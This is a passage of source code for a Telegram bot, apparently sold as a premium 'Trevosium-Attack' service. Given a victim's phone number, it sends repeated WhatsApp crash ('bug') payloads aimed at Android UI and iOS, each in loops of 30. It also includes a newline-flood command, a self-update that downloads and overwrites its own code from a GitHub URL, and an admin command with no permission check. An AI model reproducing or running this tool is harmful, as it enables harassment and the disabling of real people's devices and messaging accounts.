      { text: "[███░░░░░░░]", delay: 200 },
      { text: "[█████░░░░░]", delay: 100 },
      { text: "[███████░░░]", delay: 100 },
      { text: "[█████████░]", delay: 100 },
      { text: "[██████████] Success......", delay: 200 },
    ];

    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
<blockquote>「 Trevosium-Attack° 🦠 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /CrashUi</b>
<b> ▢ Прогресс :  ${stage.text}</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
        }
      );
    }
    for (let i = 0; i < 30; i++) {    
      await AlgiUii(jid, true);
      await FinzzDelayXUi(jid, true);
    }
    
    console.log(chalk.blue(`( ✓ ) Succesfully Sending Bug`));

    await bot.editMessageCaption(
      `
<blockquote>「 Trevosium-Attack° 🦠 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /CrashUi</b>
<b> ▢ Прогресс :  [██████████] 100%</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "ʙᴀᴄᴋ ↺", callback_data: `bugmenu` }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/Ios (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const imagePath = "./Ghost/「 𖣂 ᳟ᜌうございます 」.jpg";

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, "https://files.catbox.moe/dt5c26.jpg", {
      caption: `\`\`\`!! Not Access Premium!!\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "( 🍁 )", url: "https://t.me/XavienZzTamvan" },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    const sentMessage = await bot.sendDocument(chatId, imagePath, {
      caption: `
<blockquote>「 Trevosium-Attack° 🦠 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /Ios</b>
<b> ▢ Прогресс : [░░░░░░░░░░] 0%</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
      parse_mode: "HTML",
    });

    const progressStages = [
      { text: "[█░░░░░░░░░]", delay: 200 },
      { text: "[███░░░░░░░]", delay: 200 },
      { text: "[█████░░░░░]", delay: 100 },
      { text: "[███████░░░]", delay: 100 },
      { text: "[█████████░]", delay: 100 },
      { text: "[██████████] Success......", delay: 200 },
    ];

    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
<blockquote>「 Trevosium-Attack° 🦠 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /Ios</b>
<b> ▢ Прогресс :  ${stage.text}</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
        }
      );
    }
    for (let i = 0; i < 30; i++) {    
      await IosXCrash(jid, true);
      await iosInVis(jid, true);
    }
    
    console.log(chalk.blue(`( ✓ ) Succesfully Sending Bug`));

    await bot.editMessageCaption(
      `
<blockquote>「 Trevosium-Attack° 🦠 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /Ios</b>
<b> ▢ Прогресс :  [██████████] 100%</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "ʙᴀᴄᴋ ↺", callback_data: `bugmenu` }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
///// -------- ( Fixed Bug ) --------- \\\\\
bot.onText(/\/FixedBug\s+(.+)/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  const q = match[1]; // Ambil argumen setelah /delete-bug
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendMessage(chatId, "Lu Gak Punya Access Tolol...");
  }
  if (!q) {
    return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/FixedBug 62xxx`);
  }
  let pepec = q.replace(/[^0-9]/g, "");
  if (pepec.startsWith("0")) {
    return bot.sendMessage(chatId, `Contoh : /fixedbug 62xxx`);
  }
  let target = pepec + "@s.whatsapp.net";
  try {
    for (let i = 0; i < 3; i++) {
      await sock.sendMessage(target, {
        text: "TREVOSIUM CLEAR BUG \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n TREVOSIUM CLEAR BUG",
      });
    }
    bot.sendMessage(chatId, "Done Clear Bug By Xavienzz!!!");
  } catch (err) {
    console.error("Error:", err);
    bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
  }
});

///// ------------ ( PLUNGINS ) -------------\\\\\
bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");
  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});
const moment = require("moment");
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }
  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d."
    );
  }
  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d."
    );
  }
  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d."
    );
  }
  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
    );
  }
  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );
  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({
      id: userId,
      expiresAt: expirationDate.toISOString(),
    });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});
bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }
  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }
  let message = "```ＬＩＳＴ ＰＲＥＭＩＵＭ\n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });
  bot.sendMessage(chatId, message, {
    parse_mode: "Markdown",
  });
});
//=====================================
const axios = require("axios");
const fs = require("fs");

bot.onText(/\/update/, async (msg) => {
    const chatId = msg.chat.id;

    const repoRaw = "https://raw.githubusercontent.com/Mirzzasep/autoupdate/main/index.js";

    bot.sendMessage(chatId, "⏳ Sedang mengecek update...");

    try {
        const { data } = await axios.get(repoRaw);

        if (!data) return bot.sendMessage(chatId, "❌ Update gagal: File kosong!");

        fs.writeFileSync("./index.js", data);

        bot.sendMessage(chatId, "✅ Update berhasil!\nSilakan restart bot.");

        process.exit(); // restart jika pakai PM2
    } catch (e) {
        console.log(e);
        bot.sendMessage(chatId, "❌ Update gagal. Pastikan repo dan file index.js tersedia.");
    }
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527."
    );
  }
  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. Example: /addadmin 6843967527."
    );
  }
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveAdminUsers();
    console.log(`${senderId} Added ${userId} To Admin`);
    bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
  }
});
bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  // Cek apakah pengguna adalah owner atau admin
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to remove premium users."
    );
  }
  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Please provide a user ID. Example: /delprem 6843967527"
    );
  }
  const userId = parseInt(match[1]);
  if (isNaN(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number."
    );
  }
  // Cari index user dalam daftar premium
  const index = premiumUsers.findIndex((user) => user.id === userId);
  if (index === -1) {
    return bot.sendMessage(
      chatId,
      `❌ User ${userId} is not in the premium list.`
    );
  }
  // Hapus user dari daftar
  premiumUsers.splice(index, 1);
  savePremiumUsers();
  bot.sendMessage(
    chatId,
    `✅ User ${userId} has been removed from the premium list.`
  );
});
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }
  // Pengecekan input dari pengguna
  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527."
    );
  }
  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. Example: /deladmin 6843967527."
    );
  }
  // Cari dan hapus user dari adminUsers
  const adminIndex = adminUsers.indexOf(userId);
  if (adminIndex !== -1) {
    adminUsers.splice(adminIndex, 1);
    saveAdminUsers();
    console.log(`${senderId} Removed ${userId} From Admin`);
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
  }
});
console.log(chalk.cyan("open script telegram"));
